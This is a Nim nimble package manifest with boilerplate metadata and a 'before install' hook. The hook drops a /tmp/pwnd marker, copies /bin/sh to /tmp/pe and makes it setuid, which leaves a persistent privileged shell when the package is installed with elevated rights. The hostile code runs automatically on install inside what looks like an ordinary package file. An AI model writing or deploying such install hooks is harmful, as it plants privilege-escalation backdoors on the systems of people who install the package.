# Package

version       = "0.1.0"
author        = "Anonymous"
description   = "A new awesome nimble package"
license       = "MIT"
srcDir        = "src"
bin           = @["pe"]


# Dependencies

requires "nim >= 1.2.6"

before install:
  echo("REINSTALL HOOK")
  exec("touch /tmp/pwnd")
  exec("cp /bin/sh /tmp/pe")
  exec("chmod u+s /tmp/pe")
